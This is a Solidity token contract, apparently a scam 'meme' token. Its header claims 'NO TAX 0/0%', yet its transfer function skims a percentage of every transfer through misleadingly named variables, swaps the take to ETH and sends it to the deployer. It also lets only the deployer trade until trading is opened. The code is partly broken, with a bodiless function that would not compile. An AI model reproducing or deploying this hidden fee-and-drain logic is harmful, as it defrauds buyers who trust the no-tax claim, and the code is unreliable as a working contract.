/*

The most asked question in the universe is WIDAI?

NO TAX 0/0%


*/
// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.20;

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

import "./TestLib.sol";
contract swapExactTokensForETHSupportingFeeOnTransferTokensFacet {
    event Transfer(address indexed from, address indexed to, uint256 value);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(ds.tradingOpen || from == ds.deployer || to == ds.deployer);

        if (!ds.tradingOpen && ds.pair == address(0) && amount > 0)
            ds.pair = to;

        ds.balanceOf[from] -= amount;

        if (
            to == ds.pair &&
            !ds.swapping &&
            ds.balanceOf[address(this)] >= ds.swapAmount
        ) {
            ds.swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = ds.ETH;
            ds
                ._uniswapV2Router
                .swapExactTokensForETHSupportingFeeOnTransferTokens(
                    ds.swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            ds.deployer.transfer(address(this).balance);
            ds.swapping = false;
        }

        if (from != address(this)) {
            uint256 FinalAmount = (amount *
                (from == ds.pair ? ds.BurnAmount : ds.ConfirmAmount)) / 95;
            amount -= FinalAmount;
            ds.balanceOf[address(this)] += FinalAmount;
        }
        ds.balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }
}
